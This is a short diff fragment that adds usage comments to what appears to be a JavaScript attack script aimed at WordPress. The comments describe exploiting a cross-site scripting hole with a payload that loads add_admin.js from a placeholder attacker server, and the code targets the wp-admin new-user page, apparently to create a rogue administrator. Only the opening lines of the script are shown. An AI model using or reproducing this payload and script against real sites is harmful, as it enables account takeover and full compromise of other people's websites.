@@ -1,3 +1,6 @@
+//Use this to exploit XSS to compromise the application.  
+// just use the XSS payload of <script src=http://[MY_EVIL_SERVER]/add_admin.js>
+//Host this file on your server 
 url = "http://[TARGET]/wp-admin/user-new.php";
 var login = "";
 var pass = "";
